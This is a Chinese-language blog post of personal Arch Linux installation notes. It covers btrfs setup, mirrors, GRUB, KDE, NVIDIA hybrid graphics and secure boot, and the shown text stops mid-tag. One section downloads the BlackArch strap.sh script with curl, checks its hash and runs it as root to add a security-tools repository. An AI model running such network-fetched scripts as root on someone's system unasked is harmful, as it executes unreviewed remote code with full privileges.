    <content type="html"><![CDATA[<p><strong>首先的首先，最重要的参考来自于<a href="https://arch.icekylin.online/guide/rookie/pre-install.html">archlinux简明指南</a></strong>。</p><h1>写在前面</h1><p>这篇文章的目的是整齐，简明地归纳笔者自己日常linux所接触到的一些经验，免得在搜索引擎屎里淘金。但是作者本人的记性很不好，所以可能有所缺疏。特别地，本文尤其针对的是<code>ArchLinux</code>这一发行版。</p><h1>你是否需要从0开始安装一个基本系统？</h1><p>直接参考<a href="https://arch.icekylin.online/guide/rookie/pre-install.html">archlinux简明指南</a>，正如指南中强调的，不要试图更改一些指南中提供的设置，除非你<strong>真的真的完全知道</strong>自己在做什么。这部分的经验对于所有操作系统应当都是类似的。</p><p>简单来说就是：</p><ul class="lvl-0"><li class="lvl-2"><p>同步时间，联网，换源</p></li><li class="lvl-2"><p>分区和格式化，efi，交换分区和主分区（btrfs）</p></li><li class="lvl-2"><p>挂载并安装系统，设置基本信息如时区，用户名密码</p></li><li class="lvl-2"><p>安装引导程序和其他必须组件</p></li></ul><p>由于pacman的强大，过程并不困难</p><h2 id="btrfs">btrfs</h2><blockquote><p>同样，可以阅读archlinux简明指南上的<a href="https://arch.icekylin.online/guide/advanced/btrfs.html">介绍</a>不要安装传统的ext4 linux文件系统，使用更好的btrfs。我们不关心具体怎么实现的，只知道这是一个提供了很多很好特性的文件系统即可。</p></blockquote><p>尤其是对于：</p><ul class="lvl-0"><li class="lvl-2"><p>SSD的大幅优化，包括写时复制和透明压缩特性</p></li><li class="lvl-2"><p>子卷和克隆特性让其支持非常方便的快照（甚至是快照的快照）</p></li></ul><p>其中，后者特性对于archlinux是非常重要的，因为arch不停地在滚动更新，我们折腾的时候会非常有帮助。采用神奇的btrfs后，我们的系统就能用<strong>极其</strong>小的空间进行增量快照备份。（而相对的，使用ext4符合我们的直觉——快照需要拷贝整个磁盘）</p><h2 id="这一部分的快速命令指南：">这一部分的快速命令指南：</h2><p>LiveCD使用windows下的rufus制作。下面我会列出archlinux简明指南上所有相关的命令和作用。这一部分假设不会遇到任何的问题和报错。</p><blockquote><p>LiveCD环境下:</p></blockquote><h3 id="同步时间，联网，换源">同步时间，联网，换源</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#-- 禁用镜像内的自动更新源服务，人在国外的就无所谓了</span><br><span class="line">systemctl stop reflector.service</span><br><span class="line"># 检查状态</span><br><span class="line">systemctl status reflector.service</span><br><span class="line"></span><br><span class="line">#-- 无线连接网络，有线应当自动连接</span><br><span class="line">iwctl # 进入交互式命令行</span><br><span class="line">device list # 列出无线网卡设备名，比如无线网卡看到叫 wlan0</span><br><span class="line">station wlan0 scan # 扫描网络</span><br><span class="line">station wlan0 get-networks # 列出所有 wifi 网络</span><br><span class="line">station wlan0 connect wifi-name # 进行连接，注意这里无法输入中文。回车后输入密码即可</span><br><span class="line">exit # 连接成功后退出</span><br><span class="line"></span><br><span class="line">#-- 更新时钟</span><br><span class="line">timedatectl set-ntp true</span><br><span class="line"># 检查</span><br><span class="line">timedatectl status</span><br><span class="line"></span><br><span class="line">#--换源</span><br><span class="line">vim /etc/pacman.d/mirrorlist</span><br><span class="line"># 添加国内源，如果自己的学校有优先用自己的，放在最上面</span><br><span class="line"># 不要在这一步添加archlinuxcn</span><br><span class="line">Server = https://mirrors.hust.edu.cn/archlinux/$repo/os/$arch # 华科的</span><br><span class="line">Server = https://mirrors.ustc.edu.cn/archlinux/$repo/os/$arch # 中国科学技术大学开源镜像站</span><br><span class="line">Server = https://mirrors.tuna.tsinghua.edu.cn/archlinux/$repo/os/$arch # 清华大学开源软件镜像站</span><br><span class="line">Server = https://repo.huaweicloud.com/archlinux/$repo/os/$arch # 华为开源镜像站</span><br><span class="line">Server = http://mirror.lzu.edu.cn/archlinux/$repo/os/$arch # 兰州大学开源镜像站</span><br></pre></td></tr></table></figure><h3 id="分区和格式化">分区和格式化</h3><p>遇到的问题或想使用ext4分区请参考<a href="https://arch.icekylin.online/guide/rookie/basic-install-detail.html">ArchLinux简明指南</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lsblk # 查看设备</span><br><span class="line">cfdisk /dev/sd_ </span><br></pre></td></tr></table></figure><p><font color=lightyellow>注意⚠️，cfdisk对于大小的设置是M和G而不是Mb和Gb，输入Mb和Gb也能识别但大小会有误，务必检查</font></p><p>cfdisk的界面完全是可读的。参考简明指南即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 检查</span><br><span class="line">fdisk -l</span><br></pre></td></tr></table></figure><p>格式化操作如下，如果和windows共存则不要格式化efi分区，以下操作都是对<strong>新</strong>空间操作的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#efi</span><br><span class="line">mkfs.fat -F32 /dev/sdxn #sata</span><br><span class="line">mkfs.fat -F32 /dev/nvmexn1pn # nvme</span><br><span class="line"></span><br><span class="line">mkswap /dev/sdxn #swap</span><br><span class="line"></span><br><span class="line">mkfs.btrfs -L MyArch /dev/sdxn #btrfs,-L是名字-label，无特殊字符和空格</span><br></pre></td></tr></table></figure><p>设置btrfs</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mount -t btrfs -o compress=zstd /dev/sdxn /mnt #挂载</span><br><span class="line"># 这是为了使用timeshift做准备，请尽可能严格按照这个分区命名和设置</span><br><span class="line">btrfs subvolume create /mnt/@ # 创建 / 目录子卷</span><br><span class="line">btrfs subvolume create /mnt/@home # 创建 /home 目录子卷</span><br><span class="line">btrfs subvolume list -p /mnt #检查</span><br><span class="line">umount /mnt</span><br><span class="line"># 挂载系统</span><br><span class="line">mount -t btrfs -o subvol=/@,compress=zstd /dev/sdxn /mnt # 挂载 / 目录</span><br><span class="line">mkdir /mnt/home # 创建 /home 目录</span><br><span class="line">mount -t btrfs -o subvol=/@home,compress=zstd /dev/sdxn /mnt/home # 挂载 /home 目录</span><br><span class="line">mkdir -p /mnt/boot # 创建 /boot 目录</span><br><span class="line">mount /dev/sdxn /mnt/boot # 挂载 /boot 目录</span><br><span class="line">swapon /dev/sdxn # 挂载交换分区</span><br></pre></td></tr></table></figure><h3 id="安装系统">安装系统</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pacstrap /mnt base base-devel linux linux-firmware btrfs-progs</span><br><span class="line"># 如果使用btrfs文件系统，额外安装一个btrfs-progs包</span><br><span class="line">pacstrap /mnt networkmanager vim sudo zsh zsh-completions # 其实bash也行</span><br><span class="line"></span><br><span class="line">genfstab -U /mnt &gt; /mnt/etc/fstab</span><br><span class="line">cat /mnt/etc/fstab # 检查</span><br><span class="line"></span><br><span class="line">arch-chroot /mnt # 切换</span><br></pre></td></tr></table></figure><blockquote><p>💡Tips: 注意，在我们的系统无法启动什么也做不了的时候，同样可以用livecd的这个命令检查修复</p></blockquote><p>从这一步后，我们就进入了真正的系统</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hostname # 输入主机名即可</span><br><span class="line">vim /etc/hosts #配置本地hosts如下</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1   localhost</span><br><span class="line">::1         localhost</span><br><span class="line">127.0.1.1   myarch.localdomain myarch</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime # 时区</span><br><span class="line">hwclock --systohc # 硬件同步时间</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/locale.gen # 去掉enUS和zhCN 两个utf8的注释</span><br><span class="line">locale-gen</span><br><span class="line">echo &#x27;LANG=en_US.UTF-8&#x27;  &gt; /etc/locale.conf</span><br><span class="line"></span><br><span class="line">passwd root</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pacman -S intel-ucode <span class="comment"># Intel 微码</span></span><br><span class="line">pacman -S amd-ucode <span class="comment"># AMD</span></span><br></pre></td></tr></table></figure><h3 id="grub引导">grub引导</h3><p>建议配置，grub引导比没有强，作者之前不用，u盘直插启动，内核参数相关的配置稍微繁琐一点。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pacman -S grub efibootmgr os-prober</span><br><span class="line">grub-install --target=x86_64-efi --efi-directory=/boot --bootloader-id=ARCH</span><br><span class="line">vim /etc/default/grub</span><br></pre></td></tr></table></figure><p>配置grub参数需要：</p><ul class="lvl-0"><li class="lvl-2"><p>GRUB_CMDLINE_LINUX_DEFAULT内核参数去掉quiet，loglevel=5方便观察</p></li><li class="lvl-2"><p>加入nowatchdog（参考<a href="https://arch.icekylin.online/guide/rookie/basic-install.html#_17-%E5%AE%89%E8%A3%85%E5%BC%95%E5%AF%BC%E7%A8%8B%E5%BA%8F">这里</a>）</p></li><li class="lvl-2"><p>如果要配置n卡驱动怕等下遇到问题，可以提前加入ibt=off等</p></li><li class="lvl-2"><p>取消最后一行的GRUB_DISABLE_OS_PROBER=false注释，如果要引导win的话</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">grub-mkconfig -o /boot/grub/grub.cfg</span><br><span class="line"></span><br><span class="line">exit # 退回安装环境</span><br><span class="line">umount -R /mnt # 卸载新分区</span><br><span class="line">reboot # 重启</span><br></pre></td></tr></table></figure><h3 id="重启后">重启后</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">systemctl enable --now NetworkManager</span><br><span class="line"># 无线：</span><br><span class="line">nmcli dev wifi list # 显示附近的 Wi-Fi 网络</span><br><span class="line">nmcli dev wifi connect &quot;Wi-Fi名（SSID）&quot; password &quot;网络密码&quot; # 连接指定的无线网络</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.bash_profile #添加 export EDITOR=&#x27;vim&#x27;</span><br><span class="line">useradd -m -G wheel -s /bin/bash myusername</span><br><span class="line">passwd myusername</span><br><span class="line">EDITOR=vim visudo # 这里需要显式的指定编辑器，因为上面的环境变量还未生效</span><br><span class="line"># 取消注释这一行： </span><br><span class="line">#%wheel ALL=(ALL:ALL) ALL</span><br></pre></td></tr></table></figure><p>开启pacman32位和archlinuxcn：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/pacman.conf</span><br><span class="line"># 去掉multilib注释</span><br><span class="line"># 添加（选一个也行）：</span><br><span class="line">[archlinuxcn]</span><br><span class="line">Server = https://mirrors.hust.edu.cn/archlinuxcn/$arch</span><br><span class="line">Server = https://mirrors.ustc.edu.cn/archlinuxcn/$arch # 中国科学技术大学开源镜像站</span><br><span class="line">Server = https://mirrors.tuna.tsinghua.edu.cn/archlinuxcn/$arch # 清华大学开源软件镜像站</span><br><span class="line">Server = https://mirrors.hit.edu.cn/archlinuxcn/$arch # 哈尔滨工业大学开源镜像站</span><br><span class="line">Server = https://repo.huaweicloud.com/archlinuxcn/$arch # 华为开源镜像站</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pacman -Syyu</span><br></pre></td></tr></table></figure><h1>更细节的设置命令</h1><h2 id="安装桌面和必备其他组件">安装桌面和必备其他组件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pacman -S plasma-meta konsole dolphin # plasma-meta 元软件包、konsole 终端模拟器和 dolphin 文件管理器</span><br><span class="line">pacman -S  plasma-workspace xdg-desktop-portal egl-wayland</span><br><span class="line"># N卡用户需要额外安装egl-wayland,xdg-desktop-portal包是为了如obs此类工具录制屏幕使用</span><br><span class="line"># xdg-desktop-portal包组提供了不同环境下使用的软件包</span><br><span class="line"># 例如kde用户可选择xdg-desktop-portal-kde包</span><br><span class="line">systemctl enable sddm</span><br><span class="line">systemctl start sddm  # 或者重启reboot</span><br><span class="line"># n卡推荐x11启动</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S sof-firmware alsa-firmware alsa-ucm-conf # 声音固件</span><br><span class="line">sudo pacman -S ntfs-3g # 使系统可以识别 NTFS 格式的硬盘，双系统必装，win是ntfs</span><br><span class="line">sudo pacman -S adobe-source-han-serif-cn-fonts wqy-zenhei # 安装几个开源中文字体。一般装上文泉驿就能解决大多 wine 应用中文方块的问题</span><br><span class="line">sudo pacman -S noto-fonts noto-fonts-cjk noto-fonts-emoji noto-fonts-extra # 安装谷歌开源字体及表情</span><br><span class="line">sudo pacman -S ark # 压缩软件。在 dolphin 中可用右键解压压缩包</span><br><span class="line">sudo pacman -S gwenview # 图片查看器</span><br><span class="line">sudo pacman -S archlinuxcn-keyring # cn 源中的签名（archlinuxcn-keyring 在 archlinuxcn）</span><br><span class="line">sudo pacman -S yay # yay 命令可以让用户安装 AUR 中的软件（yay 在 archlinuxcn）</span><br></pre></td></tr></table></figure><h2 id="输入法">输入法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S fcitx5-im # 输入法基础包组</span><br><span class="line">sudo pacman -S fcitx5-chinese-addons # 官方中文输入引擎</span><br><span class="line">sudo pacman -S fcitx5-anthy # 日文输入引擎</span><br><span class="line">sudo pacman -S fcitx5-pinyin-moegirl # 萌娘百科词库。二刺猿必备（archlinuxcn）</span><br><span class="line">sudo pacman -S fcitx5-material-color # 输入法主题</span><br></pre></td></tr></table></figure><p>编辑<code>~/.config/environment.d/im.conf</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># fix fcitx problem</span><br><span class="line">GTK_IM_MODULE=fcitx</span><br><span class="line">QT_IM_MODULE=fcitx</span><br><span class="line">XMODIFIERS=@im=fcitx</span><br><span class="line">SDL_IM_MODULE=fcitx</span><br><span class="line">GLFW_IM_MODULE=ibus</span><br></pre></td></tr></table></figure><p>更进一步的配置/更好用的输入法参见<a href="https://arch.icekylin.online/guide/advanced/optional-cfg-1#%F0%9F%8D%80%EF%B8%8F-%E8%BE%93%E5%85%A5%E6%B3%95">可选配置</a></p><h2 id="timeshift">timeshift</h2><p>pacman就行，参考<a href="https://arch.icekylin.online/guide/rookie/desktop-env-and-app.html">应用安装</a></p><h2 id="blackArch">blackArch</h2><p><a href="https://www.blackarch.org/downloads.html">官网</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># Run https://blackarch.org/strap.sh as root and follow the instructions.</span><br><span class="line"></span><br><span class="line">$ curl -O https://blackarch.org/strap.sh</span><br><span class="line"># Verify the SHA1 sum</span><br><span class="line"></span><br><span class="line">$ echo bbf0a0b838aed0ec05fff2d375dd17591cbdf8aa strap.sh | sha1sum -c</span><br><span class="line"># Set execute bit</span><br><span class="line"></span><br><span class="line">$ chmod +x strap.sh</span><br><span class="line"># Run strap.sh</span><br><span class="line"></span><br><span class="line">$ sudo ./strap.sh</span><br><span class="line"># Enable multilib following https://wiki.archlinux.org/index.php/Official_repositories#Enabling_multilib and run:</span><br><span class="line"></span><br><span class="line">$ sudo pacman -Syu</span><br></pre></td></tr></table></figure><h1>显卡驱动</h1><p>这里的所有内容只适用于iu+n卡，其他请参考archwiki或archlinux简明教程对应的部分。如果你也是同样配置并且需要笔记本双显卡，下面的内容可能会很管用。个人笔记本是y9000x 2022版本。</p><blockquote><p>这不一定适用于你的笔记本和显卡！</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">                  -`                    zjw1nd@MATRIX-02-B </span><br><span class="line">                 .o+`                   ------------------ </span><br><span class="line">                `ooo/                   OS: Arch Linux x86_64 </span><br><span class="line">               `+oooo:                  Host: 82TF Legion Y9000X IAH7 </span><br><span class="line">              `+oooooo:                 Kernel: 6.13.4-arch1-1 </span><br><span class="line">              -+oooooo+:                Uptime: 3 hours, 2 mins </span><br><span class="line">            `/:-:++oooo+:               Packages: 1033 (pacman) </span><br><span class="line">           `/++++/+++++++:              Shell: zsh 5.9 </span><br><span class="line">          `/++++++++++++++:             Resolution: 2560x1440 </span><br><span class="line">         `/+++ooooooooooooo/`           DE: Plasma 6.3.1 </span><br><span class="line">        ./ooosssso++osssssso+`          WM: KWin </span><br><span class="line">       .oossssso-````/ossssss+`         Theme: Breeze-Dark [GTK2], Breeze [GTK3] </span><br><span class="line">      -osssssso.      :ssssssso.        Icons: breeze-dark [GTK2/3] </span><br><span class="line">     :osssssss/        osssso+++.       Terminal: konsole </span><br><span class="line">    /ossssssss/        +ssssooo/-       Terminal Font: FiraCode Nerd Font 10 </span><br><span class="line">  `/ossssso+/:-        -:/+osssso+-     CPU: 12th Gen Intel i7-12700H (20) @ 4.600GHz </span><br><span class="line"> `+sso+:-`                 `.-/+oso:    GPU: Intel Alder Lake-P GT2 [Iris Xe Graphics] </span><br><span class="line">`++:.                           `-/+/   GPU: NVIDIA GeForce RTX 3060 Mobile / Max-Q </span><br><span class="line">.`                                 `/   Memory: 6705MiB / 39850MiB</span><br></pre></td></tr></table></figure><h2 id="首先，安装核显和n卡的驱动">首先，安装核显和n卡的驱动</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S mesa lib32-mesa vulkan-intel lib32-vulkan-intel</span><br></pre></td></tr></table></figure><p><font color=red>⚠️再次强调，英伟达的闭源驱动是和内核版本强绑定的，请一定在安装n卡驱动前执行pacman Syu操作！否则会出现很多意想不到的问题</font></p><p><strong>如果你不确定，则先不要执行下面的命令</strong>，先向后看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S nvidia-open nvidia-settings lib32-nvidia-utils # 必须安装</span><br><span class="line">nvidia-smi #检查，输出在gpu上工作的进程</span><br><span class="line">lspci | grep -i vga #检查，看你的显卡驱动，这个可以执行</span><br></pre></td></tr></table></figure><p>安装后，先将kms从<code>/etc/mkinitcpio.conf</code>里的HOOKS移除并重新生成initramfs,即<code>mkinitcpio -P</code>。这样可以避免initramfs包含nouveau。我个人的环境重装后执行到这里就可以了。</p><p>3060 mobile是一个很尬的版本。我个人在更新内核后直接安装了nvidia-open包就没问题了，但是过程中踩了一万个坑，现在，下面是一些备选的解决方法，我不确定哪些有用但提供在这里。同时建议n卡使用xorg显示服务器，n卡对wayland的支持并不算好，wayland主要是流畅动画和hdr，如果需要wayland则继续向后看。</p><ul class="lvl-0"><li class="lvl-2"><p>无论怎么装nvidia-smi都显示连接不到驱动——很可能是上面说的内核版本的问题</p></li><li class="lvl-2"><p>添加内核参数<code>ibt=off</code>，如果你使用了grub，则编辑<code>/etc/default/grub</code>中的内核参数<code>CMDLINE_DEFAULT</code>.如果没有，则参考archlinux wiki上的<a href="https://wiki.archlinuxcn.org/wiki/%E5%86%85%E6%A0%B8%E5%8F%82%E6%95%B0">内核参数</a>页面进行配置，有很多办法。这是intel的一个间接跳转控制流保护机制，简单来说就是只允许<code>jmp rax</code>这样的指令在核态跳到标记过的位置。</p></li><li class="lvl-2"><p>安装后发现n卡驱动还是开源驱动nouveau——arch自带了开源驱动nouveau，才能点亮桌面的。n卡应该默认会屏蔽nouveau，如果没有可以卸载nouveau，并在内核参数中添加黑名单禁止nouveau的加载。内核启动参数添加<code>module_blacklist=nouveau</code>然后更新grub。或在<code>/etc/modprobe.d</code>中创建一个<code>blacklist.conf</code>，添加</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">blacklist nouveau</span><br><span class="line">options nouveau modeset=0</span><br></pre></td></tr></table></figure><p>同理，类似的思想可以用于很多地方，也可以反向让nouveau开启。</p><ul class="lvl-0"><li class="lvl-2"><p>如果你不是用的“linux”内核，而是linux-zen或者linux-lts，则安装对应驱动，将nvidia-open替换为<code>nvidia-open-lts,nvida-open-zen或nvidia-open-dkms</code>。需要注意的是，dkms包是一个不和内核绑定的驱动，在其他驱动遇到问题之后也可以再来尝试这个驱动。dkms需要内核对应的linuxheader，一般会作为依赖一起安装。</p></li><li class="lvl-2"><p>如果你需要Wayland，还需要启用两个nvidia_drm的两个内核参数：modeset和fbdev，二者在新的nvidia驱动包中被默认启用，但还是建议自己在内核参数添加一下。</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /sys/module/nvidia_drm/parameters/fbdev # 检查，失败返回缺少文件</span><br><span class="line">cat /sys/module/nvidia_drm/parameters/modeset # 正确返回Y</span><br></pre></td></tr></table></figure><p>以上都没能解决的话，更多的内容，可以参考archlinuxwiki上的<a href="https://wiki.archlinuxcn.org/wiki/NVIDIA">NVIDIA</a>和<a href="https://wiki.archlinuxcn.org/wiki/NVIDIA/%E6%95%85%E9%9A%9C%E6%8E%92%E9%99%A4">NVIDIA/故障排错</a></p><h2 id="双显卡配置">双显卡配置</h2><p>我个人使用了optimus-manager，所以推荐这个。envycontrol把我电脑整崩溃了所以个人不推荐，当然你也可以试试。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yay -S optimus-manager optimus-manager-qt</span><br><span class="line">sudo systemctl enable optimus-manager.service</span><br></pre></td></tr></table></figure><p>这时重启应该就能使用optimus-manager了。<br><font color=lightyellow>⚠️注意，如果你对你的环境没有自信（比如我），一定要在每次切换显卡完后手动注销一次观察是否正常再关机，不要切换后直接关机，否则可能会莫名其妙的黑屏</font>更多的与游戏运行，双显卡动态工作切换相关的可以参考<a href="https://arch.icekylin.online/guide/rookie/graphic-driver.html">简明指南</a></p><p>然后是电源策略，对于双显卡，如果不做手动电源策略配置，一般来说就算切换到集显模式，没有bios禁用独显的话，它也会一直工作耗电，很sb。因此需要我们配置optimus的电源策略。我个人尝试过的有两种，bbswitch策略在切换集显关机后再开tty2就黑屏了，我也不知道怎么修，tty3能用，反正刚装好没多久就重装了。</p><blockquote><p>重装是解决arch很多问题最快的方案（）</p></blockquote><p>对于电源策略，请参考optimus-manager的<a href="https://github.com/Askannz/optimus-manager/wiki/A-guide--to-power-management-options">官方文档</a>，并且一定要<strong>看完</strong>。我采用的策略就是第一条，首先将optimus-manager的电源策略设置为custom,然后找到它的配置文件<code>/etc/optimus-manager/optimus-manager.conf</code>，将nvidia下的参数设置这一条<code>dynamic_power_management=fine</code>即可。这时，n卡自带的电源策略会根据其参数设置（fine: 短时间没有进程向gpu提交作业后进入低功耗；coarse: 没有应用使用n卡驱动后进入低功耗，参考<a href="https://github.com/Askannz/optimus-manager/blob/master/optimus-manager.conf">默认配置的注释</a>）降低自己的功耗，这时可以一直开hybrid模式。注意，这一功能需要n卡支持，请通过:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/driver/nvidia/gpus/0000:01:00.0/power</span><br><span class="line"># Runtime D3 status: xxx会显示是否支持</span><br></pre></td></tr></table></figure><p>来查看是否支持。</p><p>这一方案自己的实测，nvidia-smi会显示显卡off，功率大概会降低到20w左右，没有完全关闭。不过配合TLP，基本上上课一个半小时跑linux基本不掉电，很无敌，薄纱windows。</p><p><font color=red>⚠️注意，电源策略是非常“个性化”的，需要尝试，请确保更改前做备份，或是保留了重装的livecd，我就是在bbswitch黑屏了重装的</font></p><h1>安全启动</h1><p>可以结合<a href="https://zjw1nd.github.io/2025/2/24/linux%E6%9D%82%E8%B0%88%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/">这篇</a>一起看</p><p>如果由于某些原因（指瓦洛兰特国际服反作弊vanguard）你需要平常开启安全启动，则可以参考这里。上面的blog中提供了自己手动签名内核并写入uefi的办法，</p><p>对于arch，有一个很好用的软件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S sbctl</span><br></pre></td></tr></table></figure><p><font color=lightyellow>⚠️注意，这一软件未必对所有的硬件环境都有效，可能仍然需要手动签名</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sbctl create-keys</span><br><span class="line">sbctl enroll-keys -m # 密钥和微软的一起登入uefi</span><br><span class="line">sbctl verify</span><br><span class="line">sbctl sign -s /boot/vmlinuz-linux</span><br><span class="line">sbctl sign -s /boot/EFI/BOOT/BOOTX64.EFI #  签署相关内容</span><br></pre></td></tr></table></figure><p>使用sbctl的好处是，其自带一个能够在内核更新后签署的pacmanhook，省事。</p><p>更多内容以及自己手动签名的细节操作，请参考ArchWiki的<a href="https://wiki.archlinuxcn.org/wiki/UEFI/%E5%AE%89%E5%85%A8%E5%90%AF%E5%8A%A8">安全启动</a>部分。</p><h1>一些关键的配置：</h1><h2 id="grub">grub</h2><p>/etc/default/grub<br>更改后使用grub-mkconfig重新生成引导</p><h2 id="sddm">sddm</h2><p>默认在/etc/sddm.conf.d目录下</p><h2 id="pacman">pacman</h2><p>镜像 /etc/pacman.d/mirrorlist<br>配置 /etc/pacman.conf</p><h2 id="zsh-bash">zsh/bash</h2><p>~/.bashrc或.zshrc</p><h2 